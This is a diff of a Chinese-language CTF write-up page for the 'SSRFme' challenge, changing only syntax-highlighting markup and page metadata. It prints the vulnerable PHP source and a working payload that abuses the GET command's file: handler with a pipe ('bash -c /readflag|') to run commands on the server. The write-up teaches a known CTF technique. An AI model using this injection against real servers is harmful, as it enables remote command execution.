@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      224 字
+      190 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      5
        分钟
     </span>
   
@@ -238,25 +246,25 @@
             <h1 style="display: none">SSRFme</h1>
             
             <div class="markdown-body">
-              <h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;
-        $http_x_headers = explode(<span class="hljs-string">&#x27;,&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);    <span class="hljs-comment">##以逗号分割$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]，返回数组</span>
-        $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="hljs-number">0</span>];
-    &#125;
+              <h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$http_x_headers</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">##以逗号分割$_SERVER['HTTP_X_FORWARDED_FOR']，返回数组</span>
+        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$http_x_headers</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-    <span class="hljs-keyword">echo</span> $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];
+    <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-    $sandbox = <span class="hljs-string">&quot;sandbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);      <span class="hljs-comment">##$_SERVER[&quot;REMOTE_ADDR&quot;]返回IP地址</span>
-    @mkdir($sandbox);    <span class="hljs-comment">##创建沙盒 </span>
-    @chdir($sandbox);    <span class="hljs-comment">##改变目录到沙盒</span>
+    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"sandbox/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">##$_SERVER["REMOTE_ADDR"]返回IP地址</span>
+    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">##创建沙盒 </span>
+    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">##改变目录到沙盒</span>
 
-    $data = shell_exec(<span class="hljs-string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="hljs-string">&quot;url&quot;</span>]));
-    $info = pathinfo($_GET[<span class="hljs-string">&quot;filename&quot;</span>]);
-    $dir  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, basename($info[<span class="hljs-string">&quot;dirname&quot;</span>]));         <span class="hljs-comment">##url参数以GET命令执行，结果存入以filename参数的值命名的文件里</span>
-    @mkdir($dir);
-    @chdir($dir);
-    @file_put_contents(basename($info[<span class="hljs-string">&quot;basename&quot;</span>]), $data);
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);</code></pre></div></code></pre>
+    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GET "</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$dir</span>  <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"dirname"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">##url参数以GET命令执行，结果存入以filename参数的值命名的文件里</span>
+    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre>
 <p>读取根目录，创建文件abc<br><code>url=/&amp;filename=abc</code><br>访问该文件<code>/sandbox/fcf2bccafc269c160382150a0166d632/abc    </code><br> <img src="https://ae03.alicdn.com/kf/U9d258cc946ec4e4fb723d7652f2049c7P.jpg" srcset="/img/loading.gif" alt="01.png"></p>
 <p>/readflag得到flag       </p>
 <p><code>bash -c /readflag|</code><br>不过要先有一个同名文件<br>然后执行该命令<br>payload：<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code>执行两遍，然后访问<code>bash -c /readflag|</code>即可得到flag       </p>
@@ -405,6 +413,8 @@
 
 
 
+  
+    
   
 
 
